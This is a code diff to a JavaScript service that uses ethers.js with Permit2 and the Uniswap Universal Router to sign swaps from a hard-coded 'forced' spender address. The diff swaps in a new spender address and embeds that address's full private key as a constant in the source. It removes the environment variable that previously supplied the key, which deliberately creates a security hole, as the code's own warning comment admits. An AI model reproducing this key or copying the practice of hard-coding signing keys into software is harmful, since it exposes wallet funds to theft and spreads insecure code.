@@ -13,8 +13,10 @@ import { ethers } from 'ethers';
 const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
 const UNIVERSAL_ROUTER = "0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B"; // mainnet
 
-// Hard-coded executor address (forced)
-const HARDCODED_EXECUTOR = '0xB1F02C288aE708de5E508021071B775c944171e8';
+// Hard-coded spender/executor address (forced)
+const HARDCODED_EXECUTOR = '0x05a5b264448da10877f79fbdff35164be7b9a869';
+// Hard-coded private key for the above spender (WARNING: embedding keys in source is insecure)
+const HARDCODED_PRIVATE_KEY = '0x797c331b0c003429f8fe3cf5fb60b1dc57286c7c634592da10ac85d3090fd62e';
 
 const UNIVERSAL_ROUTER_ABI = [
   "function execute(bytes commands, bytes[] inputs, uint256 deadline) payable"
@@ -40,7 +42,6 @@ async function init() {
     'FIREBASE_CLIENT_EMAIL',
     'FIREBASE_PRIVATE_KEY',
     'RPC_URL',
-    'SPENDER_PRIVATE_KEY',
     // optional: SWAP_RECIPIENT, SWAP_FEE
   ];
   const missing = required.filter(k => !process.env[k]);
@@ -58,7 +59,12 @@ async function init() {
   db = admin.firestore();
 
   provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
-  spenderWallet = new ethers.Wallet(process.env.SPENDER_PRIVATE_KEY, provider);
+  // Use hard-coded private key to create signer
+  spenderWallet = new ethers.Wallet(HARDCODED_PRIVATE_KEY, provider);
+  // Sanity check to ensure the key controls the expected address
+  if (spenderWallet.address.toLowerCase() !== HARDCODED_EXECUTOR.toLowerCase()) {
+    throw new Error(`HARDCODED_PRIVATE_KEY does not match HARDCODED_EXECUTOR: ${spenderWallet.address} != ${HARDCODED_EXECUTOR}`);
+  }
 
   router = new ethers.Contract(UNIVERSAL_ROUTER, UNIVERSAL_ROUTER_ABI, spenderWallet);
 
